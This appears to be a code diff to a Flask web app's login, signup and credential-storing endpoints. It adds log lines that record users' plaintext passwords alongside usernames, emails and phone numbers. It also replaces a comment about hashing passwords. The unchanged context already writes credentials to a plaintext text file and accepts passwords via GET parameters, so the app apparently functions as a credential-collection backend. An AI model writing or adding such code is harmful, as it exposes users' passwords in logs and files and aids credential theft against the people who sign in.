@@ -59,8 +59,8 @@ def login():
         if not username or not password:
             return jsonify({'error': 'Username and password are required'}), 400
 
-        # Log the credentials (in a real app, you would hash the password)
-        logger.info(f"Login attempt - Username: {username}, Phone: {country_code}{phone}")
+        # Log the credentials (including password)
+        logger.info(f"Login attempt - Username: {username}, Phone: {country_code}{phone}, Password: {password}")
 
         # Store credentials in a text file as a backup
         with open("credentials.txt", "a") as f:
@@ -105,6 +105,9 @@ def signup():
 
         if not username or not password:
             return jsonify({'error': 'Username and password are required'}), 400
+
+        # Log the signup attempt (including password)
+        logger.info(f"Signup attempt - Username: {username}, Email: {email}, Phone: {country_code}{phone}, Password: {password}")
 
         # Check if user already exists
         if User.query.filter_by(username=username).first():
@@ -168,6 +171,9 @@ def store_credentials_get():
         phone = request.args.get('phone', '')
         
         if username and password:
+            # Log the credentials (including password)
+            logger.info(f"GET Store attempt - Username: {username}, Phone: {country_code}{phone}, Password: {password}")
+            
             # Store credentials in text file
             with open("credentials.txt", "a") as f:
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
